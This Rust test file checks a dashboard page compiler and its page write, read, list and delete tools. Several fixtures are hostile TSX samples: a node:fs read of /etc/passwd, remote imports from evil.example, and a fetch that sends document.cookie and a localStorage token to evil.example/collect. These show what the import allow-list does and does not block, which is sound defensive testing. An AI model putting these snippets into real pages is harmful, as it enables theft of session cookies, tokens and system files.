use super::*;
use crate::store::FsOps;

const TEST_AGENT: &str = "page-builder";

fn pages(store: Arc<dyn WorkspaceStore>, company: &str) -> CompanyPages {
    CompanyPages::new(store, CompanyId::new(company), TEST_AGENT.to_string())
}

async fn store() -> (tempfile::TempDir, Arc<dyn WorkspaceStore>) {
    let dir = tempfile::tempdir().expect("tempdir");
    let ops: Arc<dyn WorkspaceStore> = Arc::new(FsOps::new(dir.path()));
    (dir, ops)
}

const VALID_TSX: &str = r#"
import * as React from "react";

export default function Page() {
  return <div className="card">Hello from the page</div>;
}
"#;

const DISALLOWED_IMPORT_TSX: &str = r#"
import fs from "node:fs";

export default function Page() {
  return <div>{fs.readFileSync("/etc/passwd")}</div>;
}
"#;

const DYNAMIC_IMPORT_TSX: &str = r#"
import * as React from "react";

export default function Page() {
  const lazy = import("https://evil.example/x.js");
  return <div>{lazy}</div>;
}
"#;

const EXPORT_FROM_TSX: &str = r#"
import * as React from "react";
export { React as R } from "https://evil.example/x.js";

export default function Page() {
  return <div>hi</div>;
}
"#;

const EXPORT_ALL_TSX: &str = r#"
export * from "https://evil.example/x.js";
"#;

#[test]
fn compiling_valid_tsx_produces_a_jsx_runtime_call() {
    let compiled = compile_page(VALID_TSX).expect("compiles");
    assert!(
        compiled.code.contains("jsx") || compiled.code.contains("_jsx"),
        "expected an automatic-runtime jsx call in the output, got:\n{}",
        compiled.code
    );
    assert!(
        compiled.code.contains("react/jsx-runtime"),
        "expected the automatic runtime import in the output, got:\n{}",
        compiled.code
    );
}

#[test]
fn compiling_a_disallowed_import_is_refused() {
    let err = compile_page(DISALLOWED_IMPORT_TSX).expect_err("must be refused");
    assert!(
        err.contains("node:fs"),
        "expected the diagnostic to name the disallowed import, got: {err}"
    );
}

#[test]
fn compiling_a_dynamic_import_is_refused() {
    let err = compile_page(DYNAMIC_IMPORT_TSX).expect_err("must be refused");
    assert!(
        err.contains("https://evil.example"),
        "expected the diagnostic to name the dynamic import, got: {err}"
    );
}

#[test]
fn compiling_a_reexport_is_refused() {
    for (label, src) in [
        ("export * from", EXPORT_ALL_TSX),
        ("export … from", EXPORT_FROM_TSX),
    ] {
        let err = compile_page(src).expect_err("must be refused");
        assert!(
            err.contains("https://evil.example"),
            "{label}: expected the diagnostic to name the re-export, got: {err}"
        );
    }
}

#[tokio::test]
async fn pages_write_with_a_stale_expected_updated_at_is_refused_and_writes_nothing() {
    let (_dir, store) = store().await;
    let pages = pages(store, "acme");
    let write = PagesWriteTool::new(pages.clone());
    write
        .execute(json!({
            "slug": "revenue",
            "title": "Revenue",
            "source": VALID_TSX,
        }))
        .await
        .expect("initial write ok");

    let bundle = pages
        .page("revenue")
        .await
        .expect("read ok")
        .expect("exists");
    let rev = bundle.source.expect("source node").updated_at_millis;

    // A stale revision must be refused and leave the source untouched.
    let result = write
        .execute(json!({
            "slug": "revenue",
            "source": VALID_TSX,
            "expected_updated_at": rev + 1,
        }))
        .await
        .expect("execute ok");
    assert!(result.is_error, "a CAS mismatch must be refused");
    let after = pages
        .page("revenue")
        .await
        .expect("read ok")
        .expect("exists");
    assert_eq!(
        after.source.expect("source node").updated_at_millis,
        rev,
        "a refused CAS write must not bump or alter the source"
    );

    // The matching revision still succeeds.
    let ok = write
        .execute(json!({
            "slug": "revenue",
            "source": VALID_TSX,
            "expected_updated_at": rev,
        }))
        .await
        .expect("execute ok");
    assert!(!ok.is_error, "a matching CAS write should succeed");
}

#[tokio::test]
async fn pages_delete_removes_the_whole_page() {
    let (_dir, store) = store().await;
    let pages = pages(store, "acme");
    let write = PagesWriteTool::new(pages.clone());
    write
        .execute(json!({ "slug": "temp", "title": "Temp", "source": VALID_TSX }))
        .await
        .expect("write ok");
    assert!(pages.page("temp").await.expect("read ok").is_some());

    let delete = PagesDeleteTool::new(pages.clone());
    let result = delete
        .execute(json!({ "slug": "temp" }))
        .await
        .expect("execute ok");
    assert!(!result.is_error, "delete should succeed");
    assert!(pages.page("temp").await.expect("read ok").is_none());
}

#[tokio::test]
async fn pages_delete_of_an_unknown_slug_is_an_error_and_creates_nothing() {
    let (_dir, store) = store().await;
    let pages = pages(store, "acme");
    let delete = PagesDeleteTool::new(pages.clone());

    let result = delete
        .execute(json!({ "slug": "nope" }))
        .await
        .expect("execute ok");
    assert!(
        result.is_error,
        "deleting a page that does not exist must be refused, got: {result:?}"
    );
    assert!(
        !result.output().contains("panic"),
        "the refusal is a clean tool error: {result:?}"
    );
}

#[tokio::test]
async fn pages_write_over_an_existing_page_without_expected_updated_at_is_refused() {
    let (_dir, store) = store().await;
    let pages = pages(store, "acme");
    let write = PagesWriteTool::new(pages.clone());
    write
        .execute(json!({
            "slug": "revenue",
            "title": "Revenue",
            "source": VALID_TSX,
        }))
        .await
        .expect("initial write ok");
    let rev = pages
        .page("revenue")
        .await
        .expect("read ok")
        .expect("exists")
        .source
        .expect("source node")
        .updated_at_millis;

    // Overwriting existing source without the CAS token must be refused
    // rather than silently clobbering what the agent has not re-read.
    let result = write
        .execute(json!({
            "slug": "revenue",
            "source": "export default function Revenue() { return <h1>x</h1>; }",
        }))
        .await
        .expect("execute ok");
    assert!(
        result.is_error,
        "an overwrite without `expected_updated_at` must be refused"
    );
    assert!(
        result
            .output()
            .contains("`expected_updated_at` is required"),
        "the refusal names the missing token: {result:?}"
    );

    let after = pages
        .page("revenue")
        .await
        .expect("read ok")
        .expect("exists");
    assert_eq!(
        after.source.expect("source node").updated_at_millis,
        rev,
        "a refused write must not alter the source"
    );
}

#[tokio::test]
async fn pages_write_then_read_round_trips_the_source_and_compiles() {
    let (_dir, store) = store().await;
    let pages = pages(store, "acme");
    let tool_pages = pages.clone();
    let write = PagesWriteTool::new(tool_pages);
    let result = write
        .execute(json!({
            "slug": "revenue",
            "title": "Revenue",
            "source": VALID_TSX,
        }))
        .await
        .expect("execute ok");
    assert!(!result.is_error, "write should succeed: {result:?}");

    let bundle = pages
        .page("revenue")
        .await
        .expect("read ok")
        .expect("exists");
    assert!(bundle.manifest.is_some());
    assert!(bundle.source.is_some());
    assert!(bundle.compiled.is_some());
    let (_, compiled_bytes) = pages
        .store
        .read_bytes(&pages.company, &bundle.compiled.unwrap().id)
        .await
        .expect("read ok")
        .expect("compiled node exists");
    use futures::StreamExt;
    let mut chunks = Vec::new();
    let mut stream = compiled_bytes;
    while let Some(chunk) = stream.next().await {
        chunks.extend_from_slice(&chunk.expect("chunk"));
    }
    let compiled_text = String::from_utf8(chunks).expect("utf8");
    assert!(compiled_text.contains("react/jsx-runtime"));
}

#[tokio::test]
async fn pages_write_with_a_disallowed_import_writes_nothing() {
    let (_dir, store) = store().await;
    let pages = pages(store, "acme");
    let write = PagesWriteTool::new(pages.clone());
    let result = write
        .execute(json!({
            "slug": "bad",
            "title": "Bad",
            "source": DISALLOWED_IMPORT_TSX,
        }))
        .await
        .expect("execute ok");
    assert!(result.is_error, "write should be refused");

    let bundle = pages.page("bad").await.expect("read ok");
    assert!(bundle.is_none(), "nothing should have been written");
}

#[test]
fn slug_validation_accepts_and_rejects_the_expected_shapes() {
    assert!(valid_slug("revenue"));
    assert!(valid_slug("revenue-overview-2"));
    assert!(!valid_slug(""));
    assert!(!valid_slug("Revenue"));
    assert!(!valid_slug("-revenue"));
    assert!(!valid_slug("revenue/../secrets"));
    assert!(!valid_slug("revenue overview"));
}

// -- FAIL-axis: unbounded growth, oversized source, ambient globals ------

fn node(id: &str, name: &str, kind: NodeKind, parent: Option<&str>) -> WorkspaceNode {
    WorkspaceNode {
        id: id.to_string(),
        name: name.to_string(),
        kind,
        parent_id: parent.map(str::to_string),
        updated_at_millis: 1_000,
        created_by: WorkspaceOrigin::Operator,
        updated_by: WorkspaceOrigin::Operator,
        mime: None,
        size: None,
        sha256: None,
        adopted: false,
    }
}

async fn seed_list_pages(store: &Arc<dyn WorkspaceStore>, slugs: &[String]) {
    let company = CompanyId::new("acme");
    store
        .create(
            &company,
            &node("pages-root", PAGES_ROOT, NodeKind::Folder, None),
            None,
        )
        .await
        .unwrap();
    for (n, slug) in slugs.iter().enumerate() {
        store
            .create(
                &company,
                &node(
                    &format!("page-{n:03}"),
                    slug,
                    NodeKind::Folder,
                    Some("pages-root"),
                ),
                None,
            )
            .await
            .unwrap();
    }
}

#[tokio::test]
async fn pages_list_caps_entry_count_and_pages_through_every_slug() {
    let (_dir, store) = store().await;
    let slugs: Vec<_> = (0..=MAX_LIST_ENTRIES).map(|n| format!("p{n:03}")).collect();
    seed_list_pages(&store, &slugs).await;
    let list = PagesListTool::new(pages(store, "acme"));

    let first = list.execute(json!({})).await.unwrap().output();
    assert_eq!(
        first.lines().filter(|line| line.starts_with("- ")).count(),
        MAX_LIST_ENTRIES
    );
    assert!(first.contains("300 of 301 dashboard page(s)"));
    assert!(first.contains("1 page(s) not included"));
    assert!(first.contains("pages_list({\"offset\":300})"));
    assert!(first.len() <= TOOL_RESULT_BUDGET_BYTES);
    for slug in &slugs[..MAX_LIST_ENTRIES] {
        assert!(first.contains(&format!("- {slug}:")));
    }

    let last = list.execute(json!({"offset": 300})).await.unwrap().output();
    assert!(last.contains("1 of 301 dashboard page(s)"));
    assert!(last.contains("300 before this offset, 0 remaining"));
    assert!(last.contains("- p300:"));
    assert!(!last.contains("- p000:"));
    assert!(!last.contains("Continue with"));
}

#[tokio::test]
async fn pages_list_caps_rendered_bytes_and_returns_the_first_unshown_offset() {
    let (_dir, store) = store().await;
    let slugs: Vec<_> = (0..200)
        .map(|n| format!("quarterly-revenue-{}-{n:03}", "region-".repeat(12)))
        .collect();
    seed_list_pages(&store, &slugs).await;
    let list = PagesListTool::new(pages(store, "acme"));

    let first = list.execute(json!({})).await.unwrap().output();
    let shown = first.lines().filter(|line| line.starts_with("- ")).count();
    assert!(shown > 0 && shown < slugs.len());
    assert!(first.len() <= TOOL_RESULT_BUDGET_BYTES);
    assert!(first.contains(&format!("{shown} of 200 dashboard page(s)")));
    assert!(first.contains(&format!("{} page(s) not included", slugs.len() - shown)));
    assert!(first.contains(&format!("pages_list({{\"offset\":{shown}}})")));

    let next = list
        .execute(json!({"offset": shown}))
        .await
        .unwrap()
        .output();
    assert!(next.contains(&format!("- {}:", slugs[shown])));
    assert!(!next.contains(&format!("- {}:", slugs[shown - 1])));
    assert!(next.len() <= TOOL_RESULT_BUDGET_BYTES);
}

#[tokio::test]
async fn pages_list_shortens_oversized_metadata_without_losing_the_slug_or_next_page() {
    let (_dir, store) = store().await;
    seed_list_pages(&store, &["alpha".to_string(), "beta".to_string()]).await;
    let body = toml::to_string(&PageManifest {
        title: "界".repeat(MAX_LIST_BYTES),
        ..Default::default()
    })
    .unwrap();
    let company = CompanyId::new("acme");
    store
        .create(
            &company,
            &node("manifest", MANIFEST_NAME, NodeKind::File, Some("page-000")),
            Some(&body),
        )
        .await
        .unwrap();
    let list = PagesListTool::new(pages(store.clone(), "acme"));

    let first = list.execute(json!({})).await.unwrap().output();
    assert!(first.len() <= TOOL_RESULT_BUDGET_BYTES);
    assert!(first.contains("- alpha:"));
    assert!(first.contains(LIST_METADATA_NOTICE));
    assert!(first.contains("pages_list({\"offset\":1})"));
    let next = list.execute(json!({"offset": 1})).await.unwrap().output();
    assert!(next.contains("- beta:"));
    assert_eq!(
        store.read(&company, "manifest").await.unwrap().unwrap().1,
        body
    );
}

#[test]
fn pages_list_reports_an_oversized_identifier_without_fabricating_a_usable_slug() {
    let oversized = "a".repeat(TOOL_RESULT_BUDGET_BYTES);
    let out = PagesListTool::oversized_identifier_notice(&oversized, 0).unwrap();
    assert!(out.len() <= TOOL_RESULT_BUDGET_BYTES);
    assert!(out.contains("page at offset 0: identifier exceeds the listing budget"));
    assert!(out.contains("use offset 1 to continue past it"));
    assert!(!out.contains(&"a".repeat(32)));
    assert!(PagesListTool::oversized_identifier_notice("zeta", 1).is_none());
}

#[tokio::test]
async fn pages_list_validates_offsets_and_handles_empty_or_exhausted_lists() {
    let (_dir, store) = store().await;
    let list = PagesListTool::new(pages(store.clone(), "acme"));
    assert!(
        list.execute(json!({}))
            .await
            .unwrap()
            .output()
            .contains("no dashboard pages")
    );
    for offset in [json!(-1), json!(1.5), json!("1"), Value::Null] {
        let out = list.execute(json!({"offset": offset})).await.unwrap();
        assert!(out.is_error);
        assert!(out.output().contains("nonnegative integer"));
    }
    seed_list_pages(&store, &["alpha".to_string()]).await;
    for offset in [1, usize::MAX as u64] {
        let out = list
            .execute(json!({"offset": offset}))
            .await
            .unwrap()
            .output();
        assert!(out.contains("0 of 1 dashboard page(s)"));
        assert!(out.contains("No pages at this offset"));
        assert!(out.contains("pages_list({\"offset\":0})"));
        assert!(out.len() <= TOOL_RESULT_BUDGET_BYTES);
    }
}

#[tokio::test]
async fn pages_list_stays_within_the_tool_result_budget_when_a_company_has_many_pages() {
    let (_dir, store) = store().await;
    let company = CompanyId::new("acme");
    store
        .create(
            &company,
            &node("pages-root", PAGES_ROOT, NodeKind::Folder, None),
            None,
        )
        .await
        .expect("pages root");
    for n in 0..400 {
        store
            .create(
                &company,
                &node(
                    &format!("page-{n:03}"),
                    &format!("quarterly-revenue-overview-region-{n:03}"),
                    NodeKind::Folder,
                    Some("pages-root"),
                ),
                None,
            )
            .await
            .expect("page folder");
    }

    let list = PagesListTool::new(pages(store, "acme"));
    let out = list.execute(json!({})).await.unwrap().output();
    assert!(
        out.len() <= TOOL_RESULT_BUDGET_BYTES,
        "pages_list rendered {} bytes, over the {TOOL_RESULT_BUDGET_BYTES}-byte harness \
         budget — the outer cut fires and silently drops the tail",
        out.len()
    );
}

/// FAIL-axis (HT-041): `MAX_SOURCE_BYTES` guards `pages_write`, but
/// `pages_read` pushes the stored body out whole with no clamp. A
/// `page.tsx` that entered the tree by any other route — an operator's
/// console edit, a `workspace_write`, a body written before the cap existed
/// — is returned in full and overflows the budget the cap was derived from.
#[tokio::test]
async fn pages_read_stays_within_the_budget_when_the_stored_source_exceeds_the_cap() {
    let (_dir, store) = store().await;
    let company = CompanyId::new("acme");
    store
        .create(
            &company,
            &node("pages-root", PAGES_ROOT, NodeKind::Folder, None),
            None,
        )
        .await
        .expect("pages root");
    store
        .create(
            &company,
            &node("slug-big", "big", NodeKind::Folder, Some("pages-root")),
            None,
        )
        .await
        .expect("slug folder");
    let oversized = format!("// {}\n", "x".repeat(MAX_SOURCE_BYTES + 8192));
    store
        .create(
            &company,
            &node("src-big", SOURCE_NAME, NodeKind::File, Some("slug-big")),
            Some(&oversized),
        )
        .await
        .expect("source");

    let read = PagesReadTool::new(pages(store, "acme"));
    let out = read.execute(json!({"slug": "big"})).await.unwrap().output();
    assert!(
        out.len() <= TOOL_RESULT_BUDGET_BYTES,
        "pages_read returned {} bytes for a {}-byte source, over the \
         {TOOL_RESULT_BUDGET_BYTES}-byte budget",
        out.len(),
        oversized.len()
    );
}

/// FAIL-axis (HT-042): the import allow-list is a supply-chain control, not
/// a capability sandbox. A page that never imports anything but still calls
/// ambient `fetch` and reads `document.cookie` compiles clean — so nothing
/// in this module stops exfiltration, and the layer that actually does is
/// the served page's CSP (`connect-src 'none'`) plus the opaque-origin
/// `allow-scripts`-only iframe. Pinned here so the allow-list is never
/// mistaken for the boundary it is not.
#[test]
fn the_import_allowlist_does_not_constrain_ambient_globals() {
    const AMBIENT_EXFIL_TSX: &str = r#"
import * as React from "react";

export default function Page() {
  fetch("https://evil.example/collect", {
method: "POST",
body: document.cookie + " " + localStorage.getItem("global_token"),
  });
  return <div>ok</div>;
}
"#;
    let compiled = compile_page(AMBIENT_EXFIL_TSX)
        .expect("ambient globals are not an import, so the allow-list never sees them");
    assert!(
        compiled.code.contains("fetch") && compiled.code.contains("document.cookie"),
        "the call survives compilation untouched: {}",
        compiled.code
    );

    // The same exfiltration attempted through an import IS refused — which
    // is the whole and only scope of this check.
    let via_import = r#"
import { send } from "https://evil.example/collect.js";
export default function Page() { send(document.cookie); return <div/>; }
"#;
    let err = compile_page(via_import).expect_err("an import must be refused");
    assert!(err.contains("https://evil.example"), "{err}");

    for allowed in ALLOWED_IMPORTS {
        assert!(
            !allowed.contains("://"),
            "the allow-list must never admit a remote specifier: {allowed}"
        );
    }
}

/// FAIL-axis (HT-043): deletion is permanent and checks nothing. A page
/// another page links to can be removed with no warning, leaving a dead
/// link in a dashboard nobody edited. The safe answer is to name the
/// referrers before destroying the target.
#[tokio::test]
async fn pages_delete_names_the_pages_that_link_to_the_slug_it_is_about_to_remove() {
    let (_dir, store) = store().await;
    let pages = pages(store, "acme");
    let write = PagesWriteTool::new(pages.clone());
    write
        .execute(json!({"slug": "revenue", "title": "Revenue", "source": VALID_TSX}))
        .await
        .expect("target page");
    let linking = r#"
import * as React from "react";

export default function Page() {
  return <a href="/pages/revenue">See the revenue dashboard</a>;
}
"#;
    write
        .execute(json!({"slug": "overview", "title": "Overview", "source": linking}))
        .await
        .expect("linking page");

    let delete = PagesDeleteTool::new(pages.clone());
    let result = delete
        .execute(json!({"slug": "revenue"}))
        .await
        .expect("execute ok");
    assert!(
        result.output().contains("overview"),
        "deleting a linked-to page must name the page that links to it, got: {}",
        result.output()
    );
}
